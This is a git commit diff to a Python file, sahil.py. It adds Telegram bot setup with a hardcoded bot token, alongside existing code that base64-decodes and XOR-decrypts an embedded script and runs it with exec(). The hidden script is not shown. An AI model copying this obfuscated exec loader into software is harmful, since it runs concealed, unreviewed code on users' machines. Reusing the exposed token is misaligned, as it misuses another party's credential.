2056c08c5320639f6c801db79532ae6fdb9c135f
indu <70087467+lazyindu@users.noreply.github.com>
2024-09-27 15:53:39 +0000

    ok

--- sahil.py
+++ sahil.py
@@ -1,4 +1,13 @@
 import base64
+import telebot
+# Initialize the bot with your token
+bot = telebot.TeleBot('6045043208:AAFSpU6PZBBeIfo0nj6r8jC1w7wVxSfCTlE')
+
+# First, delete any existing webhook
+bot.remove_webhook()
+
+# Now start polling
+bot.polling()
 
 def xor_encrypt_decrypt(data, key):
     return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
@@ -11,3 +20,4 @@ encrypted_script = base64.b64decode(encrypted_script_base64).decode()
 decrypted_script = xor_encrypt_decrypt(encrypted_script, key)
 
 exec(decrypted_script)
+ 
